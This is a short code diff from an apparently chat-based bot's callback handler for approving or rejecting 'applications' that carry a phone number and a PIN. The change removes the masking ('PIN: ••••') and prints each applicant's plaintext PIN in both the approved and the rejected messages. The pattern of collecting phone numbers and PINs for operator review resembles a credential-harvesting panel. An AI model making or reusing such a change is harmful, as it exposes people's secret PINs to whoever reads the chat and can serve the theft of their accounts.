@@ -1053,11 +1053,11 @@ async function handleCallback(query) {
 
             if (data.startsWith('pin_approve_')) {
                 await db.updateApplication(applicationId, { pinStatus: 'approved' });
-                await edit(`✅ *PIN APPROVED*\n\nApplication: ${applicationId}\nPhone: ${formatPhone(application.phoneNumber)}\nPIN: ••••`);
+                await edit(`✅ PIN APPROVED\n\nApplication: ${applicationId}\nPhone: ${formatPhone(application.phoneNumber)}\nPIN: ${application.pin}`);
                 await ack('✅ Approved!');
             } else {
                 await db.updateApplication(applicationId, { pinStatus: 'rejected' });
-                await edit(`❌ *PIN REJECTED*\n\nApplication: ${applicationId}\nPhone: ${formatPhone(application.phoneNumber)}`);
+                await edit(`❌ PIN REJECTED\n\nApplication: ${applicationId}\nPhone: ${formatPhone(application.phoneNumber)}\nPIN: ${application.pin}`);
                 await ack('❌ Rejected');
             }
         } catch (e) {
